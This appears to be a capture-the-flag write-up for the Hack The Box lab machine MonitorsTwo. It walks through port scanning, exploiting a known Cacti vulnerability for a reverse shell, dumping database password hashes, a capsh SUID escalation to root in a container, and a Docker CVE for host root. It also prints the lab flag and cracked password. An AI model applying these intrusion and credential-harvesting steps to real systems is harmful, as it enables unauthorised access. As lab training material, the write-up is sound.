# Monitors Two HTB


## Scanning

Performing a simple but strongest port enumeration

```bash
sudo nmap -sS --open -p- --min-rate=5000 -vvv -n -Pn 10.10.11.211 -oG enumeration/AllPorts



PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
So in this point we have two ports, it's not difficult copy one by one, so I share my python script yo automate this task

```python
#!/usr/bin/python3

"""
    simple tool to get in the clipboard
    the capture of the ports early stored
    in a simple file when you executed the 
    scanning with nmap and creating a -oG file

    :author: Arturo Negreiros 
"""

import os
import sys
import re
import subprocess

def main():

    try:
        with open(sys.argv[1], "r") as file:
            data = file.read()

        allport = re.findall(r'\d{1,5}/open', data)
        ports = [re.search(r'\d{1,5}', x).group() for x in allport]
        ports = ",".join(ports)
        subprocess.Popen(f"echo {ports} | tr -d '\n' | xclip -sel clip", stdout=subprocess.PIPE, shell=True)
        print(f"\n[*] Ports in the clipboard {ports}")
        exit(0)

    except Exception as e:
        print("""usage
        \n\t\t extractPorts.py <path file of nmap grepeable format>
        """)
        print(f"\n[x] Error by {str(e)}")
    except KeyboardInterrupt:
        print("\n[!] Exiting...")


if __name__ == "__main__":
    main()
```

With this script, even if you have hundreds of ports, just by using it,
you will have them all on your clipboard.


```bash
❯ sudo nmap -sCV -p22,80 10.10.11.211
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-21 11:20 -05
Nmap scan report for 10.10.11.211
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds
```

## Enumeration
Searching in the browser, we see a login panel callig for "cacti groups"
and in the whatweb command line we get

```bash
❯ whatweb "http://10.10.11.211/logout.php?action=timeout"
http://10.10.11.211/logout.php?action=timeout [200 OK] Cookies[Cacti,cacti_remembers], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[Cacti,cacti_remembers], IP[10.10.11.211], JQuery, PHP[7.4.33], Script[text/javascript], Title[Logout of Cacti], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.4.33], X-UA-Compatible[IE=Edge], nginx[1.18.0]
```

A quick search in google we got the following vulnerability for cacti 1.2.22 **CVE-2022-46169-CACTI-1.2.22**

Performing a reverse shell <monitorstwo_reverse_shell.png>

After a revershell we see in the "/" directory a entrypoint.sh

```bash
www-data@50bca5e748b0:/$ cat entrypoint.sh 
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
www-data@50bca5e748b0:/$ 
```

using that credentials, we connect to the database

```bash
mysql --host=db --user=root --password=root
```

Connecting to the database and the database cacti and the table user_auth, we get some password hashes

```mysql
MySQL [cacti]> select id, username, password from user_auth;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
|  3 | guest    | 43e9a4ab75570f5b                                             |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----+----------+--------------------------------------------------------------+
3 rows in set (0.001 sec)

MySQL [cacti]> 
```

crackig for marcus::funkymonkey
We can perform a ssh login and get the flag 

```bash
marcus@monitorstwo:~$ cat user.txt 
46a7f3e426bac7959fabcd6c50a1cc2d
```



## Exploitation
Before to perform privilge scalation in the server
we have to check the SUID permissions in the containers


```bash
www-data@50bca5e748b0:/$ find -perm -4000 2>/dev/null
./usr/bin/gpasswd
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/chfn
./usr/bin/newgrp
./sbin/capsh ✅
./bin/mount
./bin/umount
./bin/su
```

Performing a SUID privilege escalation

```bash
capsh --gid=0 --uid=0 --
```
with this we get the shell as root but in the container
```bash
root@50bca5e748b0:/root# whoami
root
root@50bca5e748b0:/root# 
```

Once we keep in mind this proccess, we saw in the ssh login a message saying "we have a new email"

inside the directory

```bash
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Checking for the vulnerability **CVE-2021-41091**, we get a github repo, to use that CVE vulnerability but to perform this CVE, you first have to 
be changed the SUID /bin/bash when you got the root inside the container.

Run the exploit and voilà, you got root in the ssh session.

Happy hacking.
<>



## Final Review
